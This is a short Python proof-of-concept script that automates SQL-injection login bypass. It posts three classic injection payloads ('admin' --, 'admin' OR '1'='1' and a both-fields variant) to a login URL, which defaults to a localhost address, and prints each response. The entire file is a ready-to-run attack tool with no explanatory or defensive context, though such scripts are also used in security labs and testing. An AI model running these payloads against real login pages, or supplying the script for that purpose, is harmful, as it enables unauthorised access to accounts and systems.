# poc_sqli.py
import requests

def sqli_bypass(target="http://127.0.0.1:5000/login"):
    payloads = [
        {"username": "admin' --", "password": "x"},
        {"username": "admin' OR '1'='1", "password": "x"},
        {"username": "' OR '1'='1", "password": "' OR '1'='1"}
    ]

    for data in payloads:
        print("\nTesting payload:", data)
        r = requests.post(target, data=data)
        print("Response:", r.text[:200])
        print("-" * 50)

if __name__ == "__main__":
    sqli_bypass()
